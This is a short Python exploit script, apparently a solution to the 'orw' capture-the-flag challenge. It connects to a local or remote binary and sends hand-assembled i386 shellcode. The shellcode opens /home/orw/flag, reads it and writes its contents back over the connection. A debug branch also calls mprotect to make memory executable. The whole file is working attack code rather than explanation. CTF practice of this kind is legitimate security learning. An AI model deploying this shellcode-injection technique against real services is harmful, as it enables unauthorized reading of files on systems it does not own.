#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

# context.log_level = 'debug'
exe = context.binary = ELF('./orw', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''

        b*main+14
        call (int)mprotect(0x804a000, 0x1000, 7)
        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

def exploit():

    # Path: /home/orw/flag
    # /hom -> 0x6d6f682f
    # e/or -> 0x726f2f65
    # w/fl -> 0x6c662f77
    # ag -> 0x6761

    sc = asm('''

        push 0x6761
        push 0x6c662f77
        push 0x726f2f65
        push 0x6d6f682f
        mov eax, 5
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        int 0x80

        mov ebx, eax
        mov ecx, esp
        mov edx, 0x30
        mov eax, 3
        int 0x80

        mov ebx, 1
        mov eax, 4
        int 0x80

        ''', arch='i386')

    sa(b':', sc)


    interactive()

if __name__ == '__main__':
  exploit()
